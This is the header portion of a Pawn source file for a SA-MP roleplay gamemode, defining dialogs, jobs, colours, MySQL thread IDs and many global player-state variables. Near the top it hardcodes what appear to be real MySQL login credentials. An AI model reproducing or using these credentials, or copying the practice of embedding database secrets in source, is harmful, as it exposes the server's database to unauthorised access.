/*
																			*/


#pragma warning disable 239
#pragma warning disable 214
// #pragma option -d3
//--------------------------[ SCRIPT VERSION INFO ]--------------------------
#define 					SERVER_VERSION 						"v1.9"
#define 					TEAMSPEAK 							"NA"
#define 					WEBSITE 							"NA"
/*
	Punishment Logs:
		- Warnings (1)
		- Prison (2)
		- Fine (3)
		- Ban (4)															*/
//--------------------------------[ INCLUDES ]-------------------------------
#include 					<a_samp>
#include 					<a_zones>
#include 					<streamer>
#include 					<foreach>
#include 					<progress>
#include 					<ZCMD>
#include 					<YSI/y_timers.inc>
#include 					<yom_buttons>
#include 					<sscanf2>
#include 					<a_mysql>


// #define SQL_HOST	"localhost"
// #define SQL_USER	"root"
// #define SQL_PASS	""
// #define SQL_DATA	"ngrp"

#define SQL_HOST	"localhost"
#define SQL_USER	"NextGenerati"
#define SQL_PASS	"xPsMFjjB"
#define SQL_DATA	"zNextGenerati0"


//--------------------------------[ DEFINES ]--------------------------------
			/*  ---------------- ENTITIES ----------------- */
//#define 					DOUBLE_EXP_ENABLED
//#define 					TREASURE_HUNT_ENABLED
#define 					TimeFactor 							(20) // Calculation: timeratio = 86400/tf*60*24 = times faster than a Real day - Fastest is -6. Slowest is 500. Realtime is 60. Default is 20.
#define 					MAX_HOUSES 							(1000)
#define 					MAX_DMAPICONS 						(200)
#define 					MAX_DDOORS 							(1000)
#define 					INVALID_HOUSE_ID 					(-1)
#define 					MAX_NOP_WARNINGS 					(4)
#define 					FACTION_PAY_PER_RANK 				(100) 	// This must be an even number as it's divided by 2 for rank 0 paychecks.
#define 					MAX_PLAYERVEHICLES 					(10)
#define 					MAX_PLAYERTOYS 						(8)
#define 					MAX_PLAYER_ATTOBJECTS 				(8)
#define 					MAX_MODS 							(15)
#define 					MAX_DEALERSHIPVEHICLES 				(10)
#define 					MAX_CARDEALERSHIPS 					(15)
#define 					MAX_GANG_VEHICLES 					(16)
#define 					INVALID_PLAYER_VEHICLE_ID 			(0)
#define 					NEW_VULNERABLE 						(24)
#define 					TIME_TO_CLAIM 						(1)
#define 					TIME_TO_TAKEOVER 					(10)
#define 					MAX_FAMILY 							(14)
#define 					MAX_POINTS 							(9)
#define 					MAX_GANG_VEHICLES 					(16)
#define 					TEMP_RESYNC_VW 						(3453)
#define 					MAX_MODS 							(15)
#define 					MAX_BARRICADES						(10)
#define 					VEHICLE_RESPAWN 					(2700)
#define 					MAX_REPORTS  						(1000)
#define 					INVALID_REPORT_ID 					(-1)
#define 					REPORTSMENU 						(10031)
#define 					NOOB_SKIN 							(299)
#pragma 					dynamic 							(26384)
			/*  ---------------- MySQL THREADS ----------------- */
// #define             		THREAD_NO_RESULT		         	(1)
#define             		THREAD_CONFIRM_USERNAME             (2)
#define 					THREAD_LOGIN_ATTEMPT 				(3)
#define             		THREAD_REGISTER_ACCOUNT         	(4)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_1     	(5)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_2     	(6)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_3     	(7)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_4     	(8)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_5     	(9)
#define           		  	THREAD_SAVING_FINISHED          	(10)
#define            		 	THREAD_LOAD_P_ITEMS_CHAIN_1    		(11)
#define           		  	THREAD_OFFLINE_KILLS      		    (12)
#define            			THREAD_DELETE_PLAYER_OBJECT         (13)
#define            			THREAD_LOAD_P_ITEMS_CHAIN_2    		(14)
#define           			THREAD_CHECK_BANNED                 (15)
#define            		 	THREAD_OFFLINE_IP_CHECK             (16)
#define             		THREAD_OFFLINE_BAN                  (17)
#define            		 	THREAD_OFFLINE_WARN                 (18)
#define             		THREAD_OFFLINE_FINE                 (19)
#define             		THREAD_LOAD_P_ITEMS_CHAIN_3         (20)
#define             		THREAD_GET_STATS                    (21)
#define             		THREAD_OFFLINE_PRISON               (22)
#define             		THREAD_REFERRAL_MENU                (23)
#define             		THREAD_GIVE_REF_TOKENS              (24)
#define             		THREAD_LITERALLY_GIVE_REFTOKEN      (25)
#define             		THREAD_OFFLINE_UNINVITE             (26)
#define             		THREAD_FULLY_UNINVITE               (27)
#define             		THREAD_OFFLINE_FLAG                 (28)
#define             		THREAD_CHECK_NEW_NAME               (29)
#define             		THREAD_CONFIRMED_NAMECHANGE         (30)
#define             		THREAD_CHECK_NAME_PASSWORD          (31)
#define             		THREAD_FULLY_CHANGE_PASSWORD        (32)
#define             		THREAD_LIST_NAMECHANGES           	(33)
#define             		THREAD_OFFLINE_KILLS_2           	(34)
#define             		THREAD_MDC_CHECK           			(35)
			/*  ---------------- WALK STYLES ----------------- */
#define 					WALK_DEFAULT    					(0)
#define 					WALK_NORMAL     					(1)
#define 					WALK_PED       						(2)
#define 					WALK_GANGSTA   						(3)
#define 					WALK_GANGSTA2  						(4)
#define 					WALK_OLD       						(5)
#define 					WALK_FAT_OLD   						(6)
#define 					WALK_FAT      						(7)
#define 					WALK_LADY     						(8)
#define 					WALK_LADY2    						(9)
#define 					WALK_WHORE    						(10)
#define 					WALK_WHORE2   						(11)
#define 					WALK_DRUNK     						(12)
#define 					WALK_BLIND     						(13)
			/*  ---------------- TIMERS ----------------- */
#define						TYPE_TPMATRUNTIMER 					(1)
#define						TYPE_TPDRUGRUNTIMER 				(2)
#define						TYPE_ARMSTIMER 						(3)
#define						TYPE_GIVEWEAPONTIMER 				(4)
#define						TYPE_HOSPITALTIMER 					(5)
#define						TYPE_FLOODPROTECTION 				(7)
#define 					TYPE_GUARDTIMER 					(9)
#define						TYPE_TPTRUCKRUNTIMER 				(10)
#define 					TYPE_SELLMATSTIMER 					(12)
#define 					TYPE_TPPIZZARUNTIMER 				(13)
#define 					TYPE_PIZZATIMER 					(14)
#define						TYPE_SELLMYTIMER 					(15)
			/*  ---------------- DIALOGS ----------------- */
#define						MAINMENU 							(4070)
#define						MAINMENU2 							(4071)
#define						INFO_DIALOG 						(32767)
#define						JOBHELPMENU 						(10000)
#define						DETECTIVEJOB 						(10001)
#define						DETECTIVEJOB2 						(10002)
#define						DETECTIVEJOB3 						(10003)
#define						LAWYERJOB 							(10004)
#define						LAWYERJOB2 							(10005)
#define						LAWYERJOB3 							(10006)
#define						WHOREJOB 							(10007)
#define						WHOREJOB2 							(10008)
#define						WHOREJOB3 							(10009)
#define						DRUGDEALERJOB 						(10010)
#define						DRUGDEALERJOB2 						(10011)
#define						DRUGDEALERJOB3 						(10012)
#define						MECHANICJOB 						(10013)
#define						MECHANICJOB2 						(10014)
#define						MECHANICJOB3 						(10015)
#define						BODYGUARDJOB 						(10016)
#define						BODYGUARDJOB2 						(10017)
#define						BODYGUARDJOB3 						(10018)
#define						ARMSDEALERJOB 						(10019)
#define						ARMSDEALERJOB2 						(10020)
#define						ARMSDEALERJOB3 						(10021)
#define						BOXERJOB 							(10022)
#define						BOXERJOB2 							(10023)
#define						BOXERJOB3 							(10024)
#define						TAXIJOB 							(10025)
#define						TAXIJOB2 							(10026)
#define						TAXIJOB3 							(10027)
#define						SMUGGLEJOB 							(10028)
#define						SMUGGLEJOB2 						(10029)
#define						SMUGGLEJOB3 						(10030)
#define						CRAFTJOB 							(10031)
#define						BARTENDERJOB 						(10032)
#define						TRUCKERJOB 							(10033)
#define						PIZZAJOB 							(10034)
#define						DIALOG_SHOW_NAMECHANGES 			(8927)
#define						SAN_DUTYMENU 						(5510)
#define						FINDJOB 							(10035)
#define						SIGNCHECK 							(6561)
#define						DIALOG_HUNT_QUESTION 				(852)
#define						DIALOG_HUNT_PRIZE 					(853)
#define						DIALOG_NAMECHANGE 					(261)
#define						DIALOG_NAMECHANGE2 					(262)
#define						DIALOG_SAN_CLOTHES 					(2289)
#define						FAMILYSKINDIALOG 					(5640)
#define						DOORLOCK 							(5000)
#define						DIALOG_CDGLOCKBUY 					(1310)
#define						DIALOG_CDGLOCKMENU 					(1309)
#define						GTRACKCAR 							(19102)
#define						FIGHTMENU 							(22222)
#define						COLORMENU 							(1111)
#define						STOREMENU 							(999)
#define						REGISTRATION_MENU_ONE 				(27301)
#define						REGISTRATION_MENU_TWO 				(27302)
#define						REGISTRATION_MENU_THREE 			(27303)
#define						REGISTRATION_MENU_FOUR 				(27304)
#define						REGISTRATION_MENU_FIVE 				(27305)
#define						GOVLOCKERMENU 						(4012)
#define						GOVEQUIPMENU 						(4013)
#define						GOVSKINMENU 						(4114)
#define						FINDDEALERSHIPMENU 					(4115)
#define						FINDCARTUNINGMENU 					(4116)
#define						DIALOG_ADMAIN						(32700)
#define						DIALOG_ADLIST						(32701)
#define						DIALOG_ADPLACE	 					(32702)
#define						DIALOG_ADPLACEP	 					(32703)
#define						DIALOG_ADSEARCH	 					(32704)
#define						DIALOG_ADSEARCHLIST 				(32705)
#define						DIALOG_ADFINAL	 					(32706)
#define						DIALOG_LICENSE_BUY 					(10040)
#define						NMUTE 								(4100)
#define						ADMUTE 								(4101)
#define						GOTOPLAYERCAR 						(19103)
#define						VEHICLESTORAGE 						(19104)
#define						REMOVEKEYS 							(4395)
#define						GIVEKEYS 							(4394)
#define						MPSPAYTICKETSCOP 					(4392)
#define						MPSPAYTICKETS 						(4393)
#define						TRACKCAR 							(19101)
#define						UNMODCARMENU 						(4388)
#define						DIALOG_CDLOCKBUY 					(1312)
#define						DIALOG_CDLOCKMENU 					(1311)
#define						DIALOG_CDGLOCKBUY 					(1310)
#define						DIALOG_CDGLOCKMENU 					(1309)
#define						DELETEPLAYERCAR 					(19110)
#define						DIALOG_REFSHOP 						(14555)
#define						TOYS 					 			(10131)
#define						DELETETOY 					 		(10132)
#define						WEARTOY 					 		(10133)
#define						BUYTOYS 					 		(10134)
#define						BUYTOYS2 					 		(10135)
#define						BUYTOYS3 					 		(10136)
#define						BUYTOYSGOLD 					 	(10137)
#define						BUYTOYSGOLD2 					 	(10138)
#define						BUYTOYSGOLD3 					 	(10139)
#define						EDITTOYS 					 		(10140)
#define						EDITTOYS2 					 		(10141)
#define						EDITTOYSBONE 					 	(10142)
/*#define					EDITTOYSPX 					 		(10143)
#define						EDITTOYSPY 					 		(10144)
#define						EDITTOYSPZ 					 		(10145)
#define						EDITTOYSRX 					 		(10146)
#define						EDITTOYSRY 					 		(10147)
#define						EDITTOYSRZ 					 		(10148)
#define						EDITTOYSSX							(30765)
#define						EDITTOYSSY							(30766)
#define						EDITTOYSSZ							(30767) */
#define						BUYTOYSCOP 					 		(10153)
#define						BUYTOYSCOP2 					 	(10154)
#define						BUYTOYSCOP3 					 	(10155)
#define						DIALOG_RADIOMENU_START 				(2800)
#define						DIALOG_RADIOMENU_SEARCH 			(2798)
#define						DIALOG_RADIOMENU_SEARCHLIST 		(2799)
#define						DIALOG_RADIOMENU_GENRE 				(2801)
#define						DIALOG_RADIOMENU_PLAY 				(2802)
#define						DIALOG_MP3_START 					(2803)
#define						DIALOG_MP3_SEARCH 					(2804)
#define						DIALOG_MP3_SEARCHLIST 				(2805)
#define						DIALOG_MP3_GENRE 					(2806)
#define						DIALOG_MP3_PLAY 					(2807)
#define						DIALOG_BOOMBOX_START 				(2808)
#define						DIALOG_BOOMBOX_SEARCH 				(2809)
#define						DIALOG_BOOMBOX_SEARCHLIST 			(2810)
#define						DIALOG_BOOMBOX_GENRE 				(2811)
#define						DIALOG_BOOMBOX_PLAY 				(2812)
#define						DIALOG_CDEDIT 						(1329)
#define						DIALOG_CDUPGRADE 					(1328)
#define						DIALOG_CDTILL 						(1327)
#define						DIALOG_CDEDITCARS 					(1326)
#define						DIALOG_CDEDITONE 					(1325)
#define						DIALOG_CDEDITMODEL 					(1324)
#define						DIALOG_CDEDITCOST 					(1323)
#define						DIALOG_CDEDITPARK 					(1322)
#define						DIALOG_CDDELVEH 					(1321)
#define						DIALOG_CDNEWVEH 					(1320)
#define						DIALOG_CDRADIUS 					(1319)
#define						DIALOG_CDNAME 						(1318)
#define						DIALOG_CDPRICE 						(1317)
#define						DIALOG_CDBUY 						(1316)
#define						DIALOG_CDWITHDRAW 					(1315)
#define						DIALOG_CDDEPOSIT 					(1314)
#define						DIALOG_CDSELL 						(1313)
#define						DUTYMENU 							(555)
#define						DUTYMENU2 							(666)
#define						DUTYMENU3 							(777)
#define						DUTYMENU4 							(888)
#define						DUTYMENU5 							(11111)
#define						FDUTYMENU 							(111)
#define						FDUTYMENU2 							(222)
#define						FDUTYMENU3 							(333)
#define						FDUTYMENU4 							(444)
#define						FDUTYMENU5 							(6666)
#define						LSFMDMENU 							(7777)
#define						LSFMDSKINS 							(9999)
#define						LSFMDGEAR 							(2000)
#define						MDC_START_ID 					 	(10098)
#define						MDC_MAIN 					 		(10099)
#define						MDC_FIND 							(10100)
#define						MDC_MEMBERS 					 	(10101)
#define						MDC_BLANK 					 		(10102)
#define						MDC_WARRANTS 					 	(10103)
#define						MDC_CHECK 					 		(10104)
#define						MDC_LICENSES 					 	(10105)
#define						MDC_LSPD 					 		(10106)
#define						MDC_SFPD 		 					(10107)
#define						MDC_FBI 		 					(10108)
#define						MDC_LSFMD 		 					(10109)
#define						MDC_MESSAGE 						(10110)
#define						MDC_SMS 		 					(10111)
#define						MDC_BOLOLIST 						(10112)
#define						MDC_ISSUE 		 					(10113)
#define						MDC_DELETE 		 					(10114)
#define						MDC_DEL_WARRANT 					(10115)
#define						MDC_DEL_BOLO 						(10116)
#define						MDC_LOGOUT 		 					(10117)
#define						MDC_CREATE 		 					(10118)
#define						MDC_CIVILIANS 						(10119)
#define						MDC_ISSUE_SLOT 					 	(10120)
#define						MDC_MESSAGE_2 						(10121)
#define						MDC_SMS_2 		 					(10122)
#define						MDC_BOLO 		 					(10123)
#define						MDC_BOLO_SLOT 						(10124)
#define						MDC_END_ID 							(10125)
#define						FMDC 								(10156)
#define						DRINKLISTDIALOG 					(10127)
#define						DRINKDIALOG 						(10128)
#define						TIPDIALOG 		 					(10129)
#define						DIALOG_LOADTRUCK 					(18301)
#define						DIALOG_LOADTRUCKL 					(18302)
#define						DIALOG_LOADTRUCKI 					(18303)
#define						SOUND_MUSIC1 		 				(1097)
#define						SOUND_OFF 		 					(1098)
#define 					DIALOG_VIPLOCKER 					(7832)
#define 					DIALOG_VWEAPONS 					(7833)
#define                     DIALOG_TOKENSHOP                    (18340)
#define                     DIALOG_VJOBS                        (18341)
#define 					COLOR_VIP 							0xC93CCE00

new VIPColor[MAX_PLAYERS];
new VIPmembers;
			/*  ---------------- COLORS ----------------- */
#define						TEAM_HIT_COLOR						0xFFFFFF00
#define						COLOR_GRAD1							0xB4B5B7FF
#define						COLOR_GRAD2							0xBFC0C2FF
#define						COLOR_GRAD3							0xCBCCCEFF
#define						COLOR_GRAD4							0xD8D8D8FF
#define						COLOR_GRAD5							0xE3E3E3FF
#define						COLOR_GRAD6							0xF0F0F0FF
#define						COLOR_GREY							0xAFAFAFAA
#define						COLOR_RED							0xAA3333AA
#define						COLOR_ORANGE						0xFF8000FF
#define						COLOR_YELLOW						0xFFFF00AA
#define						COLOR_FORSTATS						0xFFFF91AA
#define						COLOR_HOUSEGREEN					0x00E605AA
#define						COLOR_GREEN							0x33AA33AA
#define						COLOR_LIGHTGREEN					0x9ACD32AA
#define						COLOR_CYAN							0x40FFFFFF
#define						COLOR_PURPLE						0xC2A2DAAA
#define						COLOR_BLACK							0x000000AA
#define						COLOR_WHITE							0xFFFFFFAA
#define						COLOR_FADE1							0xE6E6E6E6
#define						COLOR_FADE2							0xC8C8C8C8
#define						COLOR_FADE3							0xAAAAAAAA
#define						COLOR_FADE4							0x8C8C8C8C
#define						COLOR_FADE5							0x6E6E6E6E
#define						COLOR_LIGHTRED						0xFF6347AA
#define						COLOR_NEWS							0xFFA500AA
#define						COLOR_TWWHITE						0xFFFFFFAA
#define						TEAM_NEWS_COLOR						0x049C7100
#define						COLOR_TWYELLOW						0xFFFF00AA
#define						COLOR_TWPINK						0xE75480AA
#define						COLOR_TWRED							0xFF0000AA
#define						COLOR_TWBROWN						0x654321AA
#define						COLOR_TWGRAY						0x808080AA
#define						COLOR_TWOLIVE						0x808000AA
#define						COLOR_TWPURPLE						0x800080AA
#define						COLOR_TWTAN							0xD2B48CAA
#define						COLOR_TWAQUA						0x00FFFFAA
#define						COLOR_TWORANGE						0xFF8C00AA
#define						COLOR_TWAZURE						0x007FFFAA
#define						COLOR_TWGREEN						0x008000AA
#define						COLOR_TWBLUE						0x0000FFAA
#define						COLOR_TWBLACK						0x000000AA
#define						COLOR_LIGHTBLUE						0x33CCFFAA
#define						TEAM_CYAN_COLOR						0xFF8282AA
#define						FIND_COLOR							0xB90000FF
#define						TEAM_AZTECAS_COLOR					0x01FCFFC8
#define						TEAM_TAXI_COLOR						0xF2FF0000
#define						TEAM_CYAN_COLOR						0xFF8282AA
#define						DEPTRADIO							0xFFD7004A
#define						RADIO								0x8D8DFFFF
#define						COLOR_DBLUE							0x2641FEAA
#define						COLOR_ALLDEPT						0xFF8282AA
#define						TEAM_BLUE_COLOR						0x2641FE00
#define						TEAM_FBI_COLOR						0x8D8DFF00
#define						TEAM_MED_COLOR						0xFF828200
#define						TEAM_APRISON_COLOR					0x9C791200
#define						COLOR_NG							0x9ACD3200
#define						COLOR_REPORT						0xFFFF91FF
#define						COLOR_NEWBIE						0x7DAEFFFF
#define						TEAM_ORANGE_COLOR					0xFF800000
#define						COLOR_PINK							0xFF66FFAA
#define						COLOR_OOC							0xE0FFFFAA
#define						COP_GREEN_COLOR						0x33AA33AA
#define						PUBLICRADIO_COLOR					0x6DFB6DFF
#define						TEAM_GROVE_COLOR					0x00D900C8
#define						COLOR_REALRED						0xFF0606FF
#define						TEAM_GREEN_COLOR					0xFFFFFFAA
#define						TEAM_ORANGE_COLOR					0xFF800000
#define						WANTED_COLOR						0xFF0000FF
#define						COLOR_GOV							0xE8E79BAA
			/*  ---------------- CHECKPOINTS ----------------- */
#define 					CHECKPOINT_NONE 					(0)
#define 					CHECKPOINT_HOME 					(12)
#define 					CHECKPOINT_HITMAN 					(123)
#define 					CHECKPOINT_LOADTRUCK 				(97651)
#define 					CHECKPOINT_RETURNTRUCK 				(97652)
			/*  ---------------- MISC ----------------- */
#define strcpy(%0,%1,%2) \
    strcat((%0[0] = '\0', %0), %1, %2)
#define HOLDING(%0) \
    ((newkeys & (%0)) == (%0))
#define RELEASED(%0) \
    (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
#define PRESSED(%0) \
    (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))

#define 					ini_SetString(%0,%1,%2)				if(%2[0]) fwrite(%0, %1), fputchar(%0, '=', false) && fwrite(%0, %2) && fwrite(%0, "\r\n")
#define 					ini_SetInteger(%0,%1,%2,%3)        	format(%1, sizeof(%1), "%s=%d\r\n", %2, %3) && fwrite(%0, %1)
#define 					ini_SetFloat(%0,%1,%2,%3)          	format(%1, sizeof(%1), "%s=%.0f\r\n", %2, %3) && fwrite(%0, %1)
#define 					ResetMoneyBar 						ResetPlayerMoney
#define 					UpdateMoneyBar 						GivePlayerMoney
#define 					GetPlayerCash(%0) 					PlayerInfo[%0][pCash]
#define 					GivePlayerCash(%0,%1) 				PlayerInfo[%0][pCash] += (%1)
#define 					GetVehicleName(%0) 					VehicleName[GetVehicleModel(%0)-400]
#define 					SetPVarInt(%0,%1,0); 				DeletePVar(%0,%1);
//---------------------------[ NATIVES ]----------------------------
native 						WP_Hash(buffer[], len, const str[]);
native 						gpci(playerid, const serial[], maxlen);
//--------------------------[ VARIABLES ]---------------------------

new Text:MainMenuTxtdraw[12];
new Text:TutTxtDraw[54];
new Text:ObjectsLoadingTD[7];
new Text:WristWatch;
new Text:txtAnimHelper;
new Text:GPS[MAX_PLAYERS];
new ghour = 0;
new shifthour = 0;
new timeshift = 0;
new iAdverTimer;
new pointboundaries[9];
new PSeconds, PMinutes, PHours;

new PaintballTeam[MAX_PLAYERS];
new EventTeam[MAX_PLAYERS];
new PlayerDragged[MAX_PLAYERS];
new PlayerDraggedBy[MAX_PLAYERS];
new IsCopDragging[MAX_PLAYERS];
new JustSuicided[MAX_PLAYERS];
new LastSMS[MAX_PLAYERS];
new IsVehicleWindowsDown[MAX_VEHICLES]; // 0 = yes, 1 = no.
new dildo;
new AntiTK;
new HouseKey[MAX_PLAYERS];
new Text3D:Helper[MAX_PLAYERS];
new walktime[MAX_PLAYERS];
new TotalLogin, TotalConnect, TotalAutoBan, TotalRegister,MaxPlayersConnected,MPDay,MPMonth,MPYear,TotalUptime,PlayerCars;
new Jackpot = 0;
new HHcheckUsed = 0;
new GlobalMOTD[128];
new AdminMOTD[128];
new Lawyers = 0;
new Mechanics = 0;
new Medics = 0;
new TaxiDrivers = 0;
new BusDrivers = 0;
new nonewbie = 0;
new noooc = 1;
new nextteam;
new callcost = 1;
new cchargetime = 60;
new txtcost = 2;

// new
// 	g_MySQLConnections[2]; // Array for future use.
new MySQL:sqldb;


new
	gaPaintballGameTimer[7],
	gaPaintballGameTimeRemaining[7],
	gaPaintballTimerHandles[7];

new VehicleStatus[MAX_VEHICLES char] = 0; // 0 == none, 1 == vehicle dead about to respawn
new Bar:LoadTruckBar[MAX_PLAYERS] = INVALID_BAR_ID;
new LoadTruckTime[MAX_PLAYERS];
new TruckDeliver[MAX_PLAYERS];
new TruckUsed[MAX_PLAYERS] = INVALID_VEHICLE_ID;
new TruckContents[MAX_VEHICLES] = 0;
new FBILobbyLeft, FBILobbyLeftBTN[2], FBILobbyRight, FBILobbyRightBTN[2], FBIPrivate[2], FBIPrivateBTN[2];
new lspdcopsonly;
new lspdeveryone;
new lspddoor1;
new lspddoor2;
new Float:Positions[14][3];
new Barricade[MAX_BARRICADES];
new LSPDVehicles[39];
new FBIVehicles[15];
new LSFMDVehicles[42];
new SANVehicles[6];
//new GovVehicles[18];
new LSPDGate;
new LSPDGate2;
new FBIGate1;
new FBIGate2;
new LSPDGateStatus;
new LSPDGate2Status;
new FBIGate1Status;
new FBIGate2Status;
new TruckerVehicles[37];
new VehicleBomb[MAX_VEHICLES char] = 0;
new PlacedVehicleBomb[MAX_PLAYERS] = INVALID_VEHICLE_ID;
new VehicleRadioStation[MAX_VEHICLES] = 0;
new vehicleMods[212][MAX_MODS][4];
new AdminRelogPassword[MAX_PLAYERS][129];
new AdminLoggedInBefore[MAX_PLAYERS];
new CreatedCars[50];
new CreatedCarsCount;
new gPlayerAccount[MAX_PLAYERS];
new gPlayerLogTries[MAX_PLAYERS];
new gPlayerLogged[MAX_PLAYERS];
//new Float:MenuTime[MAX_PLAYERS];
new InsideMainMenu[MAX_PLAYERS];
new InsideTut[MAX_PLAYERS];
new ActiveChatbox[MAX_PLAYERS];
new PlayerCuffed[MAX_PLAYERS];
new Spectate[MAX_PLAYERS];
new Spectating[MAX_PLAYERS];
new GettingSpectated[MAX_PLAYERS];
new InsideShamal[MAX_PLAYERS];
new HouseOffer[MAX_PLAYERS];
new NOPTrigger[MAX_PLAYERS];
new House[MAX_PLAYERS];
new HousePrice[MAX_PLAYERS];
new hInviteOffer[MAX_PLAYERS];
new hInviteHouse[MAX_PLAYERS];
//new hInviteSlot[MAX_PLAYERS];
new playerTabbed[MAX_PLAYERS];
new playerTabbedTime[MAX_PLAYERS];
new playerAFK[MAX_PLAYERS];
new shutdown;
new playerAFKTime[MAX_PLAYERS];
new playerLastTyped[MAX_PLAYERS];
new playerConnectedS[MAX_PLAYERS];
new playerSeconds[MAX_PLAYERS];
new pCurrentWeapon[MAX_PLAYERS];
new Float:HHcheckFloats[MAX_PLAYERS][6];
new HHcheckInt[MAX_PLAYERS];
new HHcheckVW[MAX_PLAYERS];
new gPlayerCheckpointStatus[MAX_PLAYERS];
new Float:TeleportDest[MAX_PLAYERS][3];
new Float:TeleportDest2[MAX_PLAYERS][3];
new TeleportDestInt[MAX_PLAYERS];
new TeleportDestInt2[MAX_PLAYERS];
new JetPack[MAX_PLAYERS];
new TextSpamTimes[MAX_PLAYERS];
new TextSpamUnmute[MAX_PLAYERS];
new CommandSpamTimes[MAX_PLAYERS];
new CommandSpamUnmute[MAX_PLAYERS];
new gLastCar[MAX_PLAYERS];
new GettingJob[MAX_PLAYERS];
new GettingJob2[MAX_PLAYERS];
new PayCheckCode[MAX_PLAYERS];
new AdminDuty[MAX_PLAYERS];
new FindTimePoints[MAX_PLAYERS];
new FindingPlayer[MAX_PLAYERS];
new FindTime[MAX_PLAYERS];
new UsedFind[MAX_PLAYERS];
new Condom[MAX_PLAYERS];
new SexOffer[MAX_PLAYERS];
new SexPrice[MAX_PLAYERS];
new SexWarn[MAX_PLAYERS][MAX_PLAYERS];
new Text3D:SANews3DText;
new gFam[MAX_PLAYERS];
new InviteOffer[MAX_PLAYERS];
new InviteFaction[MAX_PLAYERS];
new InviteFamily[MAX_PLAYERS];
new LockStatus[MAX_VEHICLES];
new PotOffer[MAX_PLAYERS];
new PotPrice[MAX_PLAYERS];
new PotGram[MAX_PLAYERS];
new CrackOffer[MAX_PLAYERS];
new CrackPrice[MAX_PLAYERS];
new CrackGram[MAX_PLAYERS];
new CrackWarn[MAX_PLAYERS][MAX_PLAYERS];
new PotWarn[MAX_PLAYERS][MAX_PLAYERS];
new JobDuty[MAX_PLAYERS];
new WantLawyer[MAX_PLAYERS];
new CallLawyer[MAX_PLAYERS];
new HelperPM[MAX_PLAYERS];
new SpeakerPhone[MAX_PLAYERS];
new JailPrice[MAX_PLAYERS];
new DefendOffer[MAX_PLAYERS];
new DefendPrice[MAX_PLAYERS];
new CP[MAX_PLAYERS];
new GuardOffer[MAX_PLAYERS];
new GuardPrice[MAX_PLAYERS];
new GuardWarn[MAX_PLAYERS][MAX_PLAYERS];
new GunOffer[MAX_PLAYERS];
new GunId[MAX_PLAYERS];
new GunMats[MAX_PLAYERS];
new MatsOffer[MAX_PLAYERS];
new MatsPrice[MAX_PLAYERS];
new MatsAmount[MAX_PLAYERS];
new MatsWarn[MAX_PLAYERS][MAX_PLAYERS];
new InRing = 0;
new BoxDelay = 0;
new RoundStarted = 0;
new Boxer1 = INVALID_PLAYER_ID;
new Boxer2 = INVALID_PLAYER_ID;
new PlayerBoxing[MAX_PLAYERS];
new BoxOffer[MAX_PLAYERS];
new BoxWaitTime[MAX_PLAYERS];
new UsedWeed[MAX_PLAYERS];
new UsedCrack[MAX_PLAYERS];
new PlayerStoned[MAX_PLAYERS];
new TransportDuty[MAX_PLAYERS];
new TransportValue[MAX_PLAYERS];
new TransportMoney[MAX_PLAYERS];
new TransportTime[MAX_PLAYERS];
new TransportCost[MAX_PLAYERS];
new TransportDriver[MAX_PLAYERS];
new ConsumingMoney[MAX_PLAYERS];
new BusCallTime[MAX_PLAYERS];
new BusAccepted[MAX_PLAYERS];
new TaxiCallTime[MAX_PLAYERS];
new TaxiAccepted[MAX_PLAYERS];
new TaxiCall = 999;
new BusCall = 999;
new MechanicCall = 999;
new MedicCall = 999;
new TaxiWarn[MAX_PLAYERS][MAX_PLAYERS];
new DrinkOffer[MAX_PLAYERS];
new DrinkWarn[MAX_PLAYERS][MAX_PLAYERS];
new PayWarn[MAX_PLAYERS][MAX_PLAYERS];
new Float:StopaniFloats[MAX_PLAYERS][3];
new FishCount[MAX_PLAYERS];
new CraftOffer[MAX_PLAYERS];
new CraftId[MAX_PLAYERS];
new CraftMats[MAX_PLAYERS];
new CraftName[MAX_PLAYERS][50];
new VehicleSpawned[MAX_PLAYERS];
new VehicleOffer[MAX_PLAYERS];
new VehicleId[MAX_PLAYERS];
new VehiclePrice[MAX_PLAYERS];
new ListItemReleaseId[MAX_PLAYERS][50];
new GiveKeysTo[MAX_PLAYERS];
new ListItemTrackId[MAX_PLAYERS][50];
new RepairOffer[MAX_PLAYERS];
new RepairPrice[MAX_PLAYERS];
new RepairCar[MAX_PLAYERS];
new RepairWarn[MAX_PLAYERS][MAX_PLAYERS];
new OnDuty[MAX_PLAYERS];
new ConnectedToPC[MAX_PLAYERS];
new PlayerCuffedTime[MAX_PLAYERS];
new PhoneOnline[MAX_PLAYERS];
new pTazer[MAX_PLAYERS];
new pTazerReplace[MAX_PLAYERS];
new TazerTimeout[MAX_PLAYERS];
new TicketOffer[MAX_PLAYERS];
new TicketMoney[MAX_PLAYERS];
new arr_Towing[MAX_PLAYERS];
new Fixr[MAX_PLAYERS];
new gBug[MAX_PLAYERS];
new GotHit[MAX_PLAYERS];
new GoChase[MAX_PLAYERS];
new GetChased[MAX_PLAYERS];
new HitOffer[MAX_PLAYERS];
new HitToGet[MAX_PLAYERS];
new gNews[MAX_PLAYERS];
new JustReported[MAX_PLAYERS];
new NewbieTimer[MAX_PLAYERS];
new gNewbie[MAX_PLAYERS];
new Float:EventFloats[MAX_PLAYERS][6]; // 0 = EventLastR 1 = EventLastX 2 = EventLastY 3 = EventLastZ 4 = EventLastH 5 = EventLastA
new EventLastInt[MAX_PLAYERS];
new EventLastVW[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new CalledCops[MAX_PLAYERS];
new CopsCallTime[MAX_PLAYERS];
new CalledMedics[MAX_PLAYERS];
new MedicsCallTime[MAX_PLAYERS];
new Music[MAX_PLAYERS];
new PlayerTied[MAX_PLAYERS];
new gRadio[MAX_PLAYERS];
new CallCost[MAX_PLAYERS];
new szAdvert[MAX_PLAYERS][128];
new IsBoundsShowingFFC[MAX_PLAYERS];
new IsBoundsShowingMP1[MAX_PLAYERS];
new IsBoundsShowingMF1[MAX_PLAYERS];
new IsBoundsShowingMP2[MAX_PLAYERS];
new IsBoundsShowingMF2[MAX_PLAYERS];
new IsBoundsShowingAEC[MAX_PLAYERS];
new IsBoundsShowingDH[MAX_PLAYERS];
new IsBoundsShowingCL[MAX_PLAYERS];
